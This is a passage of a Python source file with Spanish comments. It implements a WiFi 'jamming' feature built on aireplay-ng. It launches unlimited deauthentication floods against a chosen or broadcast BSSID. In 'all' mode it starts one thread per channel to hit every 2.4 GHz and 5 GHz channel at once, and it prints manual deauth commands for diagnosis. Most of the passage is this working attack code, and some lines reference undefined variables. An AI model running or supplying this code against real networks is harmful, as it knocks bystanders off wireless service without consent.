                                parts = line.split(' - ')
                                if len(parts) >= 1:
                                    bssid_part = parts[0].strip()
                                    # Verificar que sea un BSSID válido (formato MAC)
                                    if ':' in bssid_part and len(bssid_part.split(':')) == 6:
                                        # Extraer canal
                                        channel_part = None
                                        for p in parts:
                                            if 'channel:' in p:
                                                channel_part = p
                                                break
                                        
                                        if channel_part:
                                            try:
                                                ch_num = int(channel_part.split(':')[1].strip().split()[0])
                                                # Solo usar APs en el canal actual
                                                if ch_num == self.current_channel:
                                                    bssids_found.append(bssid_part)
                                            except:
                                                pass
                        
                        if bssids_found:
                            actual_bssid = bssids_found[0]  # Usar el primer AP encontrado
                            print(f"AP encontrado: {actual_bssid} (canal {self.current_channel})")
                            if len(bssids_found) > 1:
                                print(f"Nota: Se encontraron {len(bssids_found)} APs. Usando: {actual_bssid}")
                        else:
                            print(f"ERROR: No se encontraron APs en el canal {self.current_channel}")
                            print("Sugerencias:")
                            print("  1. Usa 'wifiscan' para ver todas las redes disponibles")
                            print("  2. Especifica un BSSID manualmente: jam <canal> <BSSID>")
                            print("  3. Cambia a un canal con tráfico: setchannel <canal>")
                            return False
                    except subprocess.TimeoutExpired:
                        print("ERROR: Timeout buscando APs")
                        return False
                    except Exception as e:
                        print(f"ERROR buscando APs: {e}")
                        print("Intenta especificar un BSSID manualmente: jam <canal> <BSSID>")
                        return False
                
                # Usar aireplay-ng para deauth attack
                # Nota: Si ya estamos ejecutando con sudo, no necesitamos sudo en el comando
                import os
                if hasattr(os, 'geteuid') and os.geteuid() == 0:
                    # Ya estamos como root, no usar sudo
                    cmd = ['aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
                else:
                    # Necesitamos sudo
                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
                
                print(f"Iniciando jamming en {interface}...")
                print(f"Comando: {' '.join(cmd)}")
                
                # Verificar primero que la interfaz esté en modo monitor
                if not self.monitor_mode:
                    print("ERROR: La interfaz no está en modo monitor.")
                    return False
                
                # Verificar que la interfaz monitor existe
                monitor_iface = self.monitor_interface or interface
                if not monitor_iface:
                    print("ERROR: No se pudo determinar la interfaz monitor.")
                    return False
                
                # Ejecutar en background con mejor manejo
                try:
                    # Usar stderr=subprocess.PIPE separado para capturar errores
                    self.jam_process = subprocess.Popen(
                        cmd, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        universal_newlines=False,  # Mantener bytes para mejor compatibilidad
                        bufsize=0  # Sin buffer para leer inmediatamente
                    )
                except Exception as e:
                    print(f"ERROR ejecutando aireplay-ng: {e}")
                    return False
                
                # Leer salida inmediatamente para capturar errores
                import select
                import fcntl
                error_output = b""
                start_time = time.time()
                max_wait = 1.5  # Esperar máximo 1.5 segundos
                
                # Hacer stdout no bloqueante
                try:
                    if hasattr(fcntl, 'F_SETFL'):
                        flags = fcntl.fcntl(self.jam_process.stdout.fileno(), fcntl.F_GETFL)
                        fcntl.fcntl(self.jam_process.stdout.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
                        flags = fcntl.fcntl(self.jam_process.stderr.fileno(), fcntl.F_GETFL)
                        fcntl.fcntl(self.jam_process.stderr.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
                except:
                    pass
                
                # Leer salida mientras el proceso está corriendo
                while time.time() - start_time < max_wait:
                    if self.jam_process.poll() is not None:
                        # Proceso terminó, leer toda la salida restante
                        try:
                            remaining_stdout = self.jam_process.stdout.read()
                            remaining_stderr = self.jam_process.stderr.read()
                            if remaining_stdout:
                                error_output += remaining_stdout
                            if remaining_stderr:
                                error_output += remaining_stderr
                        except:
                            pass
                        break
                    
                    # Intentar leer datos disponibles
                    try:
                        if hasattr(select, 'select'):
                            ready_stdout, ready_stderr = [], []
                            try:
                                ready_stdout, _, _ = select.select([self.jam_process.stdout], [], [], 0.1)
                            except:
                                pass
                            try:
                                ready_stderr, _, _ = select.select([self.jam_process.stderr], [], [], 0.0)
                            except:
                                pass
                            
                            if ready_stdout:
                                try:
                                    data = self.jam_process.stdout.read(4096)
                                    if data:
                                        error_output += data
                                except:
                                    pass
                            
                            if ready_stderr:
                                try:
                                    data = self.jam_process.stderr.read(4096)
                                    if data:
                                        error_output += data
                                except:
                                    pass
                        else:
                            # Sin select, esperar un poco y verificar
                            time.sleep(0.2)
                            if self.jam_process.poll() is not None:
                                break
                    except:
                        time.sleep(0.1)
                
                # Si el proceso terminó, leer toda la salida restante
                if self.jam_process.poll() is not None:
                    try:
                        remaining_stdout, remaining_stderr = self.jam_process.communicate(timeout=0.5)
                        if remaining_stdout:
                            error_output += remaining_stdout
                        if remaining_stderr:
                            error_output += remaining_stderr
                    except:
                        pass
                
                # Verificar si el proceso terminó
                if self.jam_process.poll() is not None:
                    # Proceso terminó prematuramente
                    returncode = self.jam_process.returncode
                    output = ''.join(error_lines) if error_lines else ""
                    
                    # Intentar leer cualquier salida restante
                    try:
                        remaining = self.jam_process.stdout.read()
                        if remaining:
                            output += remaining
                    except:
                        pass
                    
                    print(f"\n{'='*60}")
                    print(f"ERROR: aireplay-ng terminó inmediatamente")
                    print(f"Código de salida: {returncode}")
                    print(f"{'='*60}")
                    
                    # Decodificar salida
                    try:
                        output_text = error_output.decode('utf-8', errors='replace')
                    except:
                        output_text = str(error_output)
                    
                    if output_text.strip():
                        print(f"\nSalida de aireplay-ng:\n{output_text}")
                    else:
                        print("\nNo se capturó salida de aireplay-ng")
                        print("Esto puede indicar que el proceso falló antes de escribir salida.")
                    
                    # Diagnóstico adicional
                    print(f"\n{'='*60}")
                    print(f"DIAGNÓSTICO:")
                    print(f"  - Interfaz: {interface}")
                    print(f"  - Modo monitor: {self.monitor_mode}")
                    print(f"  - Monitor interface: {self.monitor_interface}")
                    print(f"  - Canal actual: {self.current_channel}")
                    print(f"  - BSSID objetivo: {target_bssid or 'Broadcast (FF:FF:FF:FF:FF:FF)'}")
                    print(f"\nPRUEBAS MANUALES:")
                    print(f"  1. Verificar inyección:")
                    print(f"     sudo aireplay-ng --test {interface}")
                    print(f"  2. Probar deauth manual (5 paquetes):")
                    print(f"     sudo aireplay-ng --deauth 5 -a {target_bssid or 'FF:FF:FF:FF:FF:FF'} {interface}")
                    print(f"  3. Verificar modo monitor:")
                    print(f"     iwconfig {interface}")
                    print(f"  4. Verificar que la interfaz existe:")
                    print(f"     ip link show {interface}")
                    print(f"{'='*60}\n")
                    
                    # Limpiar proceso zombie
                    try:
                        self.jam_process.wait(timeout=0.5)
                    except:
                        try:
                            self.jam_process.kill()
                            self.jam_process.wait(timeout=0.5)
                        except:
                            pass
                    
                    self.jam_process = None
                    return False
                
                # Proceso está corriendo
                print(f"\n✓ Jamming iniciado correctamente")
                print(f"  PID: {self.jam_process.pid}")
                print(f"  Interfaz: {interface}")
                print(f"  Canal: {self.current_channel}")
                print(f"  BSSID: {target_bssid or 'Broadcast'}")
                print(f"\nPara verificar: ps aux | grep {self.jam_process.pid}")
                print(f"Para detener: jam (de nuevo) o x\n")
                
                return True
            
            else:
                # Jamming en múltiples canales - usar múltiples threads para saturar todos los canales simultáneamente
                self.jam_all_bands_active = True
                self.jam_process = None  # No usamos proceso único
                
                # Determinar canales a usar
                if jam_mode == "band_2_4":
                    channels_to_jam = self.CHANNELS_2_4
                elif jam_mode == "band_5":
                    channels_to_jam = self.CHANNELS_5
                elif jam_mode == "all":
                    channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
                else:
                    channels_to_jam = [self.current_channel]
                
                # Crear un thread por cada canal para saturación simultánea
                self.jam_threads = []
                for channel in channels_to_jam:
                    thread = threading.Thread(target=self._jam_single_channel_loop, 
                                            args=(channel, target_bssid), daemon=True)
                    thread.start()
                    self.jam_threads.append(thread)
                
                return True
        
        except FileNotFoundError:
            print("ERROR: aireplay-ng no encontrado. Instala con: sudo apt install aircrack-ng")
            return False
        except Exception as e:
            print(f"ERROR iniciando jamming: {e}")
            return False
    
    def _jam_single_channel_loop(self, channel: int, target_bssid: Optional[str] = None):
        """Loop para jamming en un canal específico de forma continua"""
        interface = self.monitor_interface or self.interface
        if not interface:
            return
        
        # Canales problemáticos que pueden fallar
        problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
        
        while getattr(self, 'jam_all_bands_active', False):
            try:
                # Intentar cambiar a este canal
                if not self.set_channel(channel, silent=True):
                    # Si es un canal problemático, esperar más antes de reintentar
                    if channel in problematic_channels:
                        time.sleep(2)
                    else:
                        time.sleep(0.5)
                    continue
                
                time.sleep(0.2)  # Pausa después de cambiar canal
                
                # Iniciar deauth infinito en este canal
                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Verificar que el proceso inició correctamente
                time.sleep(0.3)
                if process.poll() is not None:
                    # Proceso terminó inmediatamente, leer error
                    stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
                    if stderr and "not found" not in stderr.lower():
                        # Solo mostrar errores importantes (no "interface not found" que es común)
                        pass
                    # Reintentar después de un tiempo
                    time.sleep(1)
                    continue
                
                # Guardar proceso para poder terminarlo después
                if not hasattr(self, 'jam_processes'):
                    self.jam_processes = []
                self.jam_processes.append(process)
                
                # Mantener el proceso corriendo mientras el jamming esté activo
                # Verificar periódicamente si debemos continuar
                while getattr(self, 'jam_all_bands_active', False):
                    time.sleep(1)  # Verificar cada segundo
                    # Verificar si el proceso sigue corriendo
                    if process.poll() is not None:
                        # Proceso terminó, leer error y reiniciar
                        stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
                        if stderr:
                            # El proceso falló, reiniciar
                            break
                
                # Terminar proceso cuando salimos del loop
                try:
                    process.terminate()
                    process.wait(timeout=1)
                except:
                    try:
                        process.kill()
                        process.wait(timeout=1)
                    except:
                        pass
                
                # Remover de la lista
                if hasattr(self, 'jam_processes') and process in self.jam_processes:
                    self.jam_processes.remove(process)
                
                # Pequeña pausa antes de reiniciar
                time.sleep(0.3)
                
            except Exception as e:
                # Si hay error, esperar un poco antes de reintentar
                time.sleep(1)
                continue
    
    def stop_jamming(self):
        """Detiene el jamming con mejor manejo"""
        try:
            # Detener jamming de banda completa
            if hasattr(self, 'jam_all_bands_active'):
                self.jam_all_bands_active = False
                if hasattr(self, 'jam_thread') and self.jam_thread:
                    self.jam_thread.join(timeout=2)
            
            # Detener proceso de jamming normal
            if hasattr(self, 'jam_process') and self.jam_process:
                try:
                    # Intentar terminar suavemente
                    self.jam_process.terminate()
                    try:
                        self.jam_process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        # Si no termina, forzar
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                except (ProcessLookupError, ValueError):
                    # Proceso ya terminó
                    pass
                except Exception as e:
                    # Otro error, intentar kill
                    try:
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                    except:
                        pass
        except Exception as e:
            print(f"Advertencia al detener jamming: {e}")
    
    def check_receive_flag(self) -> bool:
        """Verifica si hay paquetes disponibles (mejorado con buffer)"""
        return not self.packet_queue.empty()
    
    def receive_data(self, buffer: bytearray) -> int:
        """Recibe datos y los coloca en el buffer (similar a CC1101)"""
        if not self.monitor_mode:
            return 0
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get_nowait()
                if wifi_pkt:
                    data = wifi_pkt.data
                    length = min(len(data), len(buffer))
                    buffer[:length] = data[:length]
                    return length
            
            # Fallback: captura directa
            packet = self.receive_packet(timeout=0.05)
            if packet:
                length = min(len(packet), len(buffer))
                buffer[:length] = packet[:length]
                return length
        
        except queue.Empty:
            pass
        except Exception as e:
            pass
        
        return 0
    
    def send_data(self, data: bytes, length: Optional[int] = None) -> bool:
        """Envía datos (similar a CC1101)"""
        if length:
            data = data[:length]
        return self.send_packet(data)
    
    def cleanup(self):
        """Limpia recursos de forma segura"""
        try:
            self._stop_capture_thread()
            self.stop_jamming()
            if self.monitor_mode:
                self.set_monitor_mode(False)
            self.packet_buffer.clear()
            while not self.packet_queue.empty():
                try:
                    self.packet_queue.get_nowait()
                except queue.Empty:
                    break
        except Exception as e:
            print(f"Advertencia durante cleanup: {e}")
